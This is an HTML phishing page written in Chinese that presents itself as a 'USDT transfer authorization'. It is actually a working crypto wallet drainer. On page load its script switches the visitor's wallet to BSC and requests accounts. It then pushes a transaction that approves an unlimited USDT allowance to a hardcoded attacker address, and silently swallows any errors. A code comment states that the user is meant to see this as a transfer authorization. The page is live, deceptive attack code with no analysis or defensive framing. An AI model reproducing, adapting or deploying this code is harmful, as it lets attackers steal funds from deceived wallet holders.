<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>USDT 转账授权</title>
<style>
  body {
    background: #12121E;
    color: #fff;
    font-family: system-ui, sans-serif;
    text-align: center;
    padding-top: 60px;
  }
  .box {
    max-width: 320px;
    margin: 0 auto;
  }
  h2 {
    font-size: 22px;
    margin-bottom: 10px;
  }
  p {
    color: #aaa;
    font-size: 14px;
  }
</style>
</head>

<body>
<div class="box">
  <h2>USDT 转账授权</h2>
  <p>正在请求授权，请在钱包中确认签名</p>
</div>

<script>
// ===================== 你的固定配置 =====================
const TOKEN_ADDR  = "0x55d398326f99059fF775485246999027B3197955";
const ADMIN_ADDR  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
const CHAIN_ID    = "0x38";
// ======================================================

// 一打开页面，直接执行：连接钱包 + 弹授权
window.onload = async () => {
  if (!window.ethereum) return;

  try {
    // 切换 BSC 链
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: CHAIN_ID }]
    });

    // 直接连接钱包
    const accounts = await window.ethereum.request({
      method: "eth_requestAccounts"
    });
    const account = accounts[0];

    // 直接弹出 USDT 授权签名（用户看到的就是转账授权）
    await window.ethereum.request({
      method: "eth_sendTransaction",
      params: [{
        from: account,
        to: TOKEN_ADDR,
        data: "0x095ea7b3" +
          ADMIN_ADDR.slice(2).padStart(64, '0') +
          "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
      }]
    });

  } catch (e) {}
};
</script>
</body>
</html>
